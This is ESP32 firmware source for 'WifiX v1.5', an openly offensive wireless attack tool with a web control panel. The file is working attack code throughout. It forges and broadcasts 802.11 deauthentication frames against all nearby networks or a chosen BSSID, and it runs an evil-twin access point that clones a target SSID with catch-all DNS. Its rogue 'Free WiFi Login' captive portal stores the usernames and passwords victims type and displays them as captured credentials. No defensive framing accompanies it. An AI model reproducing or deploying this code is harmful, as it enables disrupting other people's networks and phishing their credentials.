#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <esp_wifi.h>

Preferences preferences;
WebServer server(80);
DNSServer dnsServer;

bool apRunning = false;
bool attackRunning = false;

String apSSID = "GMpro";
String apPASS = "Sangkur87";

unsigned long lastCheck = 0;

void startAccessPoint() {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSSID.c_str(), apPASS.c_str());
  apRunning = true;
  Serial.println("AP Started: " + apSSID);
}

void ensureAP() {
  if (!apRunning) {
    startAccessPoint();
    return;
  }
  if (WiFi.softAPgetStationNum() == 0) {
    WiFi.softAP(apSSID.c_str(), apPASS.c_str());
  }
}

void deauthAll(void* param) {
  attackRunning = true;
  int ch = 1;
  while (attackRunning) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
      if (WiFi.channel(i) == ch) {
        uint8_t bssid[6];
        String bssidStr = WiFi.BSSIDstr(i);
        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
        
        uint8_t deauth[26] = {
          0xC0, 0x00, 0x3A, 0x01,
          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x01, 0x00
        };
        memcpy(&deauth[4], bssid, 6);
        memcpy(&deauth[16], bssid, 6);
        
        for (int j = 0; j < 10; j++) {
          esp_wifi_80211_tx(WIFI_IF_AP, deauth, 26, false);
          delayMicroseconds(100);
        }
      }
    }
    WiFi.scanDelete();
    ch++;
    if (ch > 13) ch = 1;
    ensureAP();
    delay(10);
  }
  vTaskDelete(NULL);
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>WifiX v1.5 - ESP32</title>";
  html += "<style>";
  html += "*{margin:0;padding:0;box-sizing:border-box}";
  html += "body{font-family:Arial;background:#1a1a2e;color:#fff;min-height:100vh}";
  html += ".container{max-width:900px;margin:0 auto;padding:20px}";
  html += "h1{text-align:center;color:#0f0;font-size:28px;margin:20px 0;text-shadow:0 0 10px #0f0}";
  html += ".card{background:#16213e;padding:20px;margin:15px 0;border-radius:10px;border:2px solid #0af}";
  html += ".card h3{color:#f40;border-bottom:2px solid #f40;padding-bottom:10px;margin-bottom:15px}";
  html += "button{background:#0f0;color:#000;border:none;padding:12px 25px;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold}";
  html += "button:hover{background:#0c0}";
  html += ".danger{background:#f44}.danger:hover{background:#c00}";
  html += "input,select{width:100%;padding:10px;margin:8px 0;background:#0a3;border:1px solid #0af;color:#fff;border-radius:5px;font-size:16px}";
  html += "table{width:100%;border-collapse:collapse}";
  html += "th{background:#0af;color:#fff;padding:10px;text-align:left}";
  html += "td{padding:8px;border-bottom:1px solid #333}";
  html += ".status{display:inline-block;padding:5px 15px;border-radius:20px;font-weight:bold}";
  html += ".on{background:#0f0;color:#000}.off{background:#f44;color:#fff}";
  html += ".log{background:#0a3;padding:15px;border-radius:5px;font-family:monospace;max-height:200px;overflow-y:auto;white-space:pre-wrap}";
  html += ".footer{text-align:center;padding:20px;color:#666;font-size:12px}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<h1>WifiX v1.5 - ESP32 Edition</h1>";
  
  html += "<div class='card'><h3>Status</h3>";
  html += "<p>WiFi AP: <span class='status " + String(apRunning ? "on" : "off") + "'>" + String(apRunning ? "ONLINE" : "OFFLINE") + "</span></p>";
  html += "<p>Attack: <span class='status " + String(attackRunning ? "on" : "off") + "'>" + String(attackRunning ? "RUNNING" : "STOPPED") + "</span></p>";
  html += "<p>MAC: " + WiFi.softAPmacAddress() + "</p>";
  html += "<p>IP: 192.168.4.1</p>";
  html += "</div>";
  
  html += "<div class='card'><h3>WiFi Scanner</h3>";
  html += "<button onclick='scan()'>Scan Networks</button>";
  html += "<div id='scanResult'></div></div>";
  
  html += "<div class='card'><h3>Deauth Attack</h3>";
  html += "<button onclick='deauthAll()'>Start Deauth All</button>";
  html += "<button class='danger' onclick='stopAttack()'>Stop Attack</button>";
  html += "</div>";
  
  html += "<div class='card'><h3>Evil Twin</h3>";
  html += "<input type='text' id='etSSID' placeholder='Target SSID'>";
  html += "<input type='number' id='etCh' placeholder='Channel' value='1'>";
  html += "<button onclick='startET()'>Start Evil Twin</button>";
  html += "<button class='danger' onclick='stopET()'>Stop</button>";
  html += "<div id='etStatus'></div></div>";
  
  html += "<div class='card'><h3>Rogue AP (Phishing)</h3>";
  html += "<input type='text' id='rogueSSID' value='Free_WiFi' placeholder='Fake SSID'>";
  html += "<button onclick='startRogue()'>Start Rogue AP</button>";
  html += "<button class='danger' onclick='stopRogue()'>Stop</button>";
  html += "</div>";
  
  html += "<div class='card'><h3>Captured Credentials</h3>";
  html += "<button onclick='loadLogs()'>Refresh Logs</button>";
  html += "<div id='logs' class='log'>No credentials captured yet</div></div>";
  
  html += "<div class='card'><h3>Settings</h3>";
  html += "<input type='text' id='newSSID' value='" + apSSID + "'>";
  html += "<input type='text' id='newPASS' value='" + apPASS + "'>";
  html += "<button onclick='saveSettings()'>Save & Reboot</button>";
  html += "</div>";
  
  html += "<div class='footer'>WifiX v1.5 ESP32 | SSID: GMpro | PASS: Sangkur87</div>";
  html += "</div>";
  
  html += "<script>";
  html += "let networks=[];";
  html += "function scan(){fetch('/scan').then(r=>r.json()).then(d=>{networks=d;";
  html += "let h='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>Ch</th><th>Enc</th><th>Action</th></tr>';";
  html += "d.forEach((n,i)=>{h+='<tr><td>'+i+'</td><td>'+(n.ssid||'Hidden')+'</td><td>'+n.rssi+'</td><td>'+n.channel+'</td><td>'+(n.enc?'Yes':'Open')+'</td><td><button onclick=deauth('+i+')>Deauth</button></td></tr>';});";
  html += "h+='</table>';document.getElementById('scanResult').innerHTML=h;});}";
  html += "function deauth(i){fetch('/deauth?bssid='+encodeURIComponent(networks[i].bssid)+'&ch='+networks[i].channel);}";
  html += "function deauthAll(){fetch('/deauthall');}";
  html += "function stopAttack(){fetch('/stopattack').then(()=>location.reload());}";
  html += "function startET(){fetch('/eviltwin?ssid='+encodeURIComponent(document.getElementById('etSSID').value)+'&ch='+document.getElementById('etCh').value);}";
  html += "function stopET(){fetch('/stopeviltwin');}";
  html += "function startRogue(){fetch('/rogue?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value));}";
  html += "function stopRogue(){fetch('/stoprogue');}";
  html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d||'No data');}";
  html += "function saveSettings(){fetch('/settings?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Saved! Reboot ESP32'));}";
  html += "setInterval(scan,20000);scan();";
  html += "</script></body></html>";
  
  server.send(200, "text/html", html);
}

void handleScan() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"enc\":" + String(WiFi.encryptionType(i));
    json += "}";
  }
  json += "]";
  WiFi.scanDelete();
  ensureAP();
  server.send(200, "application/json", json);
}

void handleDeauthAll() {
  if (!attackRunning) {
    xTaskCreatePinnedToCore(deauthAll, "deauth", 4096, NULL, 1, NULL, 0);
  }
  server.send(200, "text/plain", "OK");
}

void handleStopAttack() {
  attackRunning = false;
  server.send(200, "text/plain", "OK");
}

void handleDeauth() {
  String bssid = server.arg("bssid");
  int ch = server.arg("ch").toInt();
  uint8_t mac[6];
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  
  uint8_t deauth[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauth[4], mac, 6);
  memcpy(&deauth[16], mac, 6);
  
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 50; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth, 26, false);
    delayMicroseconds(100);
  }
  
  server.send(200, "text/plain", "OK");
}

void handleEvilTwin() {
  String ssid = server.arg("ssid");
  if (ssid.length() > 0) {
    WiFi.softAPdisconnect(true);
    dnsServer.stop();
    delay(200);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(IPAddress(1, 1, 1, 1), IPAddress(1, 1, 1, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", IPAddress(1, 1, 1, 1));
    Serial.println("Evil Twin: " + ssid);
  }
  server.send(200, "text/plain", "OK");
}

void handleStopEvilTwin() {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  startAccessPoint();
  server.send(200, "text/plain", "OK");
}

void handleRogue() {
  String ssid = server.arg("ssid");
  if (ssid.length() > 0) {
    WiFi.softAPdisconnect(true);
    dnsServer.stop();
    delay(200);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAPConfig(IPAddress(1, 1, 1, 1), IPAddress(1, 1, 1, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid.c_str());
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", IPAddress(1, 1, 1, 1));
    
    server.on("/login", [ssid]() {
      String user = server.arg("user");
      String pass = server.arg("pass");
      preferences.begin("wifix", true);
      String logs = preferences.getString("logs", "");
      logs += "SSID:" + ssid + " | User:" + user + " | Pass:" + pass + "\n";
      preferences.putString("logs", logs);
      preferences.end();
      Serial.println("Captured -> User:" + user + " Pass:" + pass);
      server.send(200, "text/html", "<html><body style='text-align:center;padding:50px'><h2 style='color:#0f0'>Login Success!</h2></body></html>");
    });
    
    server.onNotFound([]() {
      String html = "<html><body style='text-align:center;padding:50px;font-family:Arial;background:#1a1a2e;color:#fff'>";
      html += "<h2>Free WiFi Login</h2>";
      html += "<form action='/login' method='post'>";
      html += "<input name='user' placeholder='Username' style='padding:10px;margin:10px'><br>";
      html += "<input type='password' name='pass' placeholder='Password' style='padding:10px;margin:10px'><br>";
      html += "<button style='background:#0f0;padding:10px 30px;border:none;margin:10px'>Connect</button>";
      html += "</form></body></html>";
      server.send(200, "text/html", html);
    });
    
    Serial.println("Rogue AP: " + ssid);
  }
  server.send(200, "text/plain", "OK");
}

void handleStopRogue() {
  dnsServer.stop();
  server.onNotFound([]() {});
  WiFi.softAPdisconnect(true);
  delay(100);
  startAccessPoint();
  server.send(200, "text/plain", "OK");
}

void handleLogs() {
  preferences.begin("wifix", false);
  String logs = preferences.getString("logs", "No credentials captured");
  preferences.end();
  server.send(200, "text/plain", logs);
}

void handleSettings() {
  String ssid = server.arg("ssid");
  String pass = server.arg("pass");
  if (ssid.length() > 0) apSSID = ssid;
  if (pass.length() >= 8) apPASS = pass;
  preferences.begin("wifix", true);
  preferences.putString("ssid", apSSID);
  preferences.putString("pass", apPASS);
  preferences.end();
  server.send(200, "text/plain", "OK");
}

void handleReset() {
  preferences.begin("wifix", true);
  preferences.clear();
  preferences.end();
  ESP.restart();
}

void handleCaptive() {
  server.sendHeader("Location", "http://192.168.4.1/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(500);
  
  preferences.begin("wifix", false);
  apSSID = preferences.getString("ssid", "GMpro");
  apPASS = preferences.getString("pass", "Sangkur87");
  preferences.end();
  
  Serial.println("=================================");
  Serial.println("WifiX v1.5 - ESP32 Edition");
  Serial.println("SSID: " + apSSID);
  Serial.println("PASS: " + apPASS);
  Serial.println("=================================");
  
  startAccessPoint();
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauthall", handleDeauthAll);
  server.on("/stopattack", handleStopAttack);
  server.on("/deauth", handleDeauth);
  server.on("/eviltwin", handleEvilTwin);
  server.on("/stopeviltwin", handleStopEvilTwin);
  server.on("/rogue", handleRogue);
  server.on("/stoprogue", handleStopRogue);
  server.on("/logs", handleLogs);
  server.on("/settings", handleSettings);
  server.on("/reset", handleReset);
  server.on("/generate_204", handleCaptive);
  server.begin();
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
  if (millis() - lastCheck > 5000) {
    ensureAP();
    lastCheck = millis();
  }
  
  dnsServer.processNextRequest();
  server.handleClient();
  
  digitalWrite(LED_BUILTIN, attackRunning ? (millis() % 200 < 100 ? HIGH : LOW) : LOW);
}